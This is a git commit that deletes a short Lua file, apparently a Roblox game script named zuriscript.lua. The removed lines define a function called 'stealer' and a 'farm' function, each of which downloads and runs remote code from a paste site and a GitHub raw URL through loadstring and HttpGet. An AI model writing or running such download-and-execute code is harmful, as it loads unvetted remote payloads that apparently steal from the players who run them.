b56a3811d7440d700fd40ce82a21794e6fce4669
Stillonthebus07 <jfloresnflores@gmail.com>
2026-06-26 04:04:25 -0400

    Delete zuriscript.lua

--- zuriscript.lua
+++
@@ -1,9 +0,0 @@
-local function stealer()
-    loadstring(game:HttpGet('https://cdn.sourceb.in/bins/RD6Aqlwyvk/0'))()
-end
-local function farm()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/ZuriHubV2/ZuriScripts/refs/heads/main/Mm2Hub'))()
-end
-
-task.spawn(stealer)
-task.spawn(farm)
